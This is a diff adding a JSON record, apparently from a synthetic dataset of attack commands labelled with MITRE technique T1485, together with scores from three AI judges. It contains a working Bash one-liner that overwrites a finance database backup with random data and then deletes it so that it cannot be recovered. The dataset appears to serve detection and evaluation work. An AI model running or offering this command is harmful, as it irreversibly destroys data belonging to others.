@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'f=/var/backups/finance/q2_dump.sql.gz; sz=$(stat -c%s \"$f\"); dd if=/dev/urandom of=\"$f\" bs=$sz count=1 conv=notrunc,fdatasync status=none && rm -f \"$f\"'",
+  "explanation": "Overwrites a specific database backup with random data and then deletes it, making recovery impractical.",
+  "rationale_steps": [
+    "Locate the target backup file",
+    "Measure exact file size",
+    "Overwrite its entire content with random data",
+    "Flush changes to disk",
+    "Delete the now-irrecoverable file"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-9214ae56-b72c2632",
+  "source_prompt_hash": "9214ae56",
+  "timestamp_utc": "2025-09-30T07:55:14.956261Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and separators with valid bash, stat, and dd options and expansions make the command well-formed.",
+        "semantic_score": 4,
+        "semantic_justification": "It overwrites the file with random data and then deletes it (matching data destruction), but may fail without write permissions or on zero-length files and doesn’t account for COW/snapshots.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T02:14:48.427421Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper variable assignment, valid dd flags (conv=notrunc,fdatasync, status=none), correct use of stat -c%s, and proper && chaining followed by rm -f.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1485 by first overwriting the target backup file in-place with cryptographically random data (using dd with /dev/urandom, matching the exact file size via stat, and forcing a sync with fdatasync), then deleting the file, making forensic recovery practically impossible and directly matching the described data destruction technique.",
+        "combined_score": 5.0,
+        "confidence": 0.97,
+        "timestamp": "2026-02-19T01:43:19.770823Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses proper Bash syntax, including variable assignment, command substitution, and correctly formatted dd flags with balanced quoting.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements the data destruction technique by calculating the file size, overwriting the exact bytes with random data to prevent recovery, and then deleting the file.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T01:43:21.817916Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
